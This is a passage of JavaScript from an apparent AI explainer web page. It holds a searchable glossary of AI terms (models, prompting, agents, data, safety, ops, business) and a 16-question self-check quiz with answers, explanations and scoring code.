      ['Decode', 'The second phase of inference, writing output one token at a time.'], ['TTFT', 'Time to first token: how long before a reply starts streaming.'],
      ['FLOPs', 'Floating-point operations. The standard measure of how much computation training or inference takes.'], ['GPU', 'A chip built for massively parallel arithmetic; the workhorse of AI training and inference.'],
      ['Pre-training', 'The huge first training stage: predicting next tokens over trillions of tokens.'], ['Fine-tuning', 'Extra training on your own examples to specialise a model.'],
      ['LoRA', 'A cheap fine-tuning method that trains small add-on weights instead of the whole model.'], ['RLHF', 'Reinforcement learning from human feedback: tuning a model toward answers people prefer.'],
      ['Constitutional AI', 'Anthropic\'s method of training with AI feedback guided by written principles.'], ['Distillation', 'Training a small model to imitate a larger one.'],
      ['Quantization', 'Storing weights with fewer bits so a model runs faster on cheaper hardware.'], ['Reasoning model', 'A model trained to think in a private scratchpad before answering.'],
      ['Test-time compute', 'Spending more tokens thinking at answer time to get better results.'], ['Effort', 'An API setting that trades thinking depth against speed and cost.'],
      ['Mixture of Experts', 'An architecture where only some sub-networks activate per token: large capacity, lower cost.'], ['KV cache', 'Stored attention data that avoids recomputing earlier tokens during generation.'],
      ['Multimodal', 'Handles more than text: images, audio, video, screens.'], ['VLM', 'Vision-language model: an LLM that can read images and screenshots.'],
      ['Diffusion model', 'A generator that creates images or video by removing noise step by step.'], ['Speech-to-speech', 'A voice model that listens and replies in audio directly, without a text step in between.'],
      ['Open weights', 'Model files you can download and run yourself.'], ['Frontier model', 'The most capable models available at a given moment.'],
      ['SLM', 'Small language model: cheap and fast, often good enough for narrow tasks.'], ['Hallucination', 'A confident answer that is false or invented.'],
      ['Scaling laws', 'The observation that loss falls predictably as data, parameters and compute grow.'],
    ],
    Prompting: [
      ['System prompt', 'Instructions set by the developer that frame every conversation.'], ['Few-shot', 'Including a few worked examples in the prompt to show the pattern.'],
      ['Chain of thought', 'Having the model reason step by step before the final answer.'], ['Prompt engineering', 'Writing clear instructions, context and examples for a model.'],
      ['Context engineering', 'Curating everything in the window (instructions, tools, history, data) at each step.'], ['Structured output', 'Forcing the model\'s reply to match a JSON schema.'],
      ['Prompt caching', 'Reusing an already-processed prompt prefix for a large discount and speedup.'], ['Compaction', 'Summarising a long history into a shorter one to free context.'],
    ],
    Agents: [
      ['Agent', 'A model using tools in a loop, choosing its own steps, until a goal is met.'], ['Agentic workflow', 'A process where AI makes some or all of the decisions about the steps.'],
      ['Harness', 'The software around a model that makes it an agent: loop, tools, context, permissions, interface.'], ['ReAct', 'Reason + Act: the think, tool, observe loop most agents use.'],
      ['Tool use', 'Also called function calling. The model requests an action; your code runs it.'], ['Tool runner', 'An SDK helper that runs the tool-calling loop for you.'],
      ['MCP', 'Model Context Protocol: an open standard for connecting AI apps to tools and data.'], ['A2A', 'Agent2Agent protocol: lets agents from different vendors discover and delegate to each other.'],
      ['Skills', 'Folders of instructions and scripts an agent loads only when a task needs them.'], ['AGENTS.md / CLAUDE.md', 'A project file telling agents how to work in a codebase.'],
      ['Subagent', 'A helper agent with its own context window, spawned by a main agent.'], ['Orchestrator', 'An agent that plans work and delegates it to other agents.'],
      ['Multi-agent system', 'Several agents cooperating, usually an orchestrator plus workers.'], ['Computer use', 'A model operating a screen with mouse and keyboard, like a person.'],
      ['Hooks', 'User scripts a harness runs before or after events such as tool calls.'], ['Human-in-the-loop', 'A person reviews or approves key steps.'],
      ['Background agent', 'An agent that works asynchronously for a long time and reports back.'], ['Worktree', 'A separate git checkout, letting several coding agents work in parallel without collisions.'],
      ['Plan mode', 'Having a coding agent explore and propose a plan before it edits anything.'], ['Heartbeat', 'A scheduled wake-up that lets an agent act unprompted (popularised by OpenClaw).'],
      ['Vibe coding', 'Building software by describing it to an AI and accepting its code with little review.'], ['Memory', 'Information a harness saves outside the model and puts back into context later.'],
    ],
    Data: [
      ['RAG', 'Retrieval-augmented generation: search your data, paste the results into context, then answer.'], ['Vector database', 'A store optimised for finding nearest embeddings.'],
      ['Chunking', 'Splitting documents into pieces for indexing.'], ['Hybrid search', 'Combining keyword search with vector search.'],
      ['Reranker', 'A model that reorders search results by relevance.'], ['Knowledge graph', 'Facts stored as entities and relationships.'],
      ['Agentic RAG', 'The agent decides when and how to search, often several times.'], ['Synthetic data', 'Training or evaluation data generated by models.'],
    ],
    Safety: [
      ['Guardrails', 'Checks around a model that block or fix bad inputs and outputs.'], ['Prompt injection', 'Malicious instructions hidden in content an agent reads.'],
      ['Jailbreak', 'A prompt crafted to make a model ignore its safety training.'], ['Lethal trifecta', 'Private data, untrusted content and external communication in one agent.'],
      ['Least privilege', 'Giving an agent only the access it needs for the task.'], ['Sandbox', 'An isolated environment that limits what an agent can touch.'],
      ['Red teaming', 'Deliberately attacking your own system to find weaknesses.'], ['Alignment', 'Making AI systems pursue the goals and values their builders intend.'],
      ['PII redaction', 'Removing personal data before it reaches a model or a log.'], ['Policy engine', 'A service that checks every agent action against written rules before it runs.'],
    ],
    Ops: [
      ['Evals', 'Repeatable tests that score an AI system\'s behaviour.'], ['LLM-as-judge', 'Using a model to grade outputs against a rubric.'],
      ['Tracing', 'Recording every model and tool call in a run for debugging.'], ['Batch API', 'Discounted, slower processing for non-urgent jobs.'],
      ['Model routing', 'Sending each request to the cheapest model that can handle it.'], ['Model gateway', 'One internal endpoint in front of every model provider, handling routing, fallbacks and budgets.'],
      ['Idempotency key', 'An ID that makes retrying an action safe, so a refund can\'t happen twice.'], ['Rate limit', 'A provider\'s cap on requests or tokens per minute.'],
      ['Drift', 'Quality changing over time as inputs, data or models change.'],
    ],
    Business: [
      ['AI-native', 'A company or product designed around AI from day one, not retrofitted.'], ['Wrapper', 'A thin product over someone else\'s model with little of its own.'],
      ['Moat', 'A lasting advantage competitors can\'t easily copy.'], ['Outcome pricing', 'Charging per result, such as a ticket solved, instead of per seat.'],
      ['Copilot vs autopilot', 'AI that assists a person, versus AI that does the job under human oversight.'], ['Service as software', 'Selling work done by agents instead of software people operate.'],
      ['Forward-deployed engineer', 'An engineer embedded with a customer to build and tune agents on their real workflows.'], ['AGI', 'Artificial general intelligence: AI matching people across most cognitive work. Definitions vary.'],
    ],
  };
  const all = Object.entries(G).flatMap(([c, xs]) => xs.map(([t, d]) => ({ c, t, d })));
  const cc = { Models: '--model', Prompting: '--ctx', Agents: '--tool', Data: '--mem', Safety: '--risk', Ops: '--ctx', Business: '--human' };
  const cats = ['All', ...Object.keys(G)];
  let cat = 'All';
  const run = () => {
    const q = $('#glossQ').value.trim().toLowerCase();
    const xs = all.filter(x => (cat === 'All' || x.c === cat) && (!q || (x.t + ' ' + x.d).toLowerCase().includes(q)));
    $('#gloss').innerHTML = xs.map(x => `<div><small style="color:var(${cc[x.c]})">${x.c}</small><b>${esc(x.t)}</b>${esc(x.d)}</div>`).join('') || '<p class="note">No match. Try a shorter word.</p>';
    $('#glossCount').textContent = `${xs.length} of ${all.length} terms`;
  };
  seg($('#glossTabs'), cats, 0, i => { cat = cats[i]; run(); });
  $('#glossQ').oninput = run;
})();

/* ---------- 33 quiz ---------- */
(function quiz() {
  const Q = [
    ['What does an LLM fundamentally do?', ['Looks up answers in a database of facts', 'Predicts the next token given everything in its context', 'Remembers past conversations and learns from each', 'Runs code to compute answers'], 1, 'It is a next-token predictor. Facts, tools and memory come from what you put in the context.'],
    ['You chat for an hour and the bot still "remembers" your first message. Why?', ['The model updates its weights as you talk', 'The app re-sends the conversation history on every call', 'Tokens are stored permanently on the GPU', 'Attention keeps long-term memory'], 1, 'Models are stateless. Chat apps re-send history each turn, which is also why long chats cost more.'],
    ['Temperature 0.1 compared with 1.5:', ['0.1 is more random', '0.1 almost always picks the most likely token', 'They only change speed', '1.5 makes the model smarter'], 1, 'Low temperature sharpens the distribution toward the top choice; high temperature flattens it.'],
    ['Why are output tokens usually pricier than input tokens?', ['They contain more characters', 'Output is generated one token at a time (decode), while input is read in parallel (prefill)', 'Providers charge a tax on answers', 'Output tokens are stored longer'], 1, 'Prefill processes the prompt in one parallel sweep; decode is sequential and uses the GPU less efficiently.'],
    ['When is raising a reasoning model\'s effort most worthwhile?', ['Classifying short support tickets', 'A multi-step debugging or planning task', 'Greeting a user', 'Formatting a date'], 1, 'Extra thinking pays off on hard, multi-step problems and mostly adds cost on simple ones.'],
    ['Your support bot invents refund rules. Best first fix?', ['Raise the temperature', 'RAG over the real policy, with instructions to cite and to say "I don\'t know"', 'A longer system prompt in capital letters', 'Fine-tune it on general chat data'], 1, 'Ground it in the real source and give it a way out. Hallucination falls when the answer is in context.'],
    ['In tool calling, who actually runs the tool?', ['The model itself', 'Your application or harness', 'The user', 'The tokenizer'], 1, 'The model only outputs a structured request. Your code decides whether and how to execute it.'],
    ['The minimum definition of an agent:', ['A model with a long context window', 'A model plus tools plus a loop that continues until done', 'Any chatbot with a name', 'A fine-tuned model'], 1, 'Tools let it act; the loop lets it keep going and react to results.'],
    ['After 40 turns your agent gets worse and pricier. First thing to try?', ['Add more tools', 'Context engineering: compact, clear old tool outputs, use subagents', 'Raise max output tokens', 'Switch to a bigger model'], 1, 'The window is full of stale tokens that are re-sent every turn. Curate it first.'],
    ['MCP mainly solves:', ['Model training cost', 'The many-to-many integration problem between AI apps and tools', 'Image quality', 'GPU shortages'], 1, 'One standard protocol turns N×M custom integrations into N+M.'],
    ['When does a multi-agent system make the most sense?', ['A small, tightly coupled code change', 'Broad research that splits into independent subtopics', 'Answering one FAQ', 'When you want the lowest token bill'], 1, 'Parallel workers with clean contexts suit separable work, at a much higher token cost.'],
    ['Why did coding agents become useful before most other agents?', ['Code is shorter than prose', 'Tests and compilers give fast, objective feedback on whether the work is right', 'Programmers type faster', 'Code has no context limits'], 1, 'Agents improve when they can verify their own work, and code offers cheap, reliable checks.'],
    ['Which combination is the "lethal trifecta"?', ['Speed, cost and accuracy', 'Private data, untrusted content and the ability to communicate externally', 'Three models voting', 'RAG, tools and memory'], 1, 'Together these let injected instructions exfiltrate data. Remove one leg or gate the outbound path.'],
    ['You can draw the full flowchart for a process. You should build:', ['An autonomous multi-agent system', 'A workflow, with AI in the steps that need it', 'Nothing, since AI can\'t help', 'A fine-tuned model'], 1, 'If the path is known, a workflow is cheaper, faster and easier to test than an agent.'],
    ['What does a model gateway add to a production system?', ['Faster GPUs', 'One endpoint for all providers with routing, fallbacks, caching and budgets', 'A new model architecture', 'A chat interface'], 1, 'It centralises the operational concerns of calling models so every team gets them for free.'],
    ['Which startup idea is most defensible?', ['A nicely prompted tweet writer on a public API', 'A vertical agent inside dental clinics\' scheduling and insurance systems, priced per claim processed', 'A general chatbot with a new logo', 'A prompt library sold as a PDF'], 1, 'Workflow depth, integrations, domain data and outcome pricing all compound as models improve.'],
  ];
  const box = $('#quiz'), answered = {};
  box.innerHTML = Q.map(([q, os], i) => `<div class="q" data-q="${i}"><p class="qq"><span class="c-mute">${String(i + 1).padStart(2, '0')}</span> ${esc(q)}</p><div class="opts">${os.map((o, j) => `<button data-o="${j}">${esc(o)}</button>`).join('')}</div><p class="why" hidden></p></div>`).join('');
  box.onclick = e => {
    const b = e.target.closest('[data-o]'); if (!b) return;
    const qd = b.closest('.q'), i = +qd.dataset.q; if (i in answered) return;
    const j = +b.dataset.o, ok = j === Q[i][2];
    answered[i] = ok;
    $$('button', qd).forEach((x, k) => { if (k === Q[i][2]) x.classList.add('right'); else if (k === j) x.classList.add('wrong'); x.disabled = true; });
    const w = $('.why', qd); w.hidden = false; w.innerHTML = `<strong class="${ok ? 'c-tool' : 'c-risk'}">${ok ? 'Correct.' : 'Not quite.'}</strong> ${esc(Q[i][3])}`;
    const n = Object.values(answered).filter(Boolean).length, a = Object.keys(answered).length;
    $('#quizScore').textContent = `Score: ${n} / ${Q.length}`;
    $('#quizLevel').textContent = a === Q.length ? (n >= 15 ? 'Level · Pro' : n >= 12 ? 'Level · Advanced' : n >= 7 ? 'Level · Intermediate' : 'Level · Beginner, revisit Part I') : `${a} of ${Q.length} answered`;
  };
})();
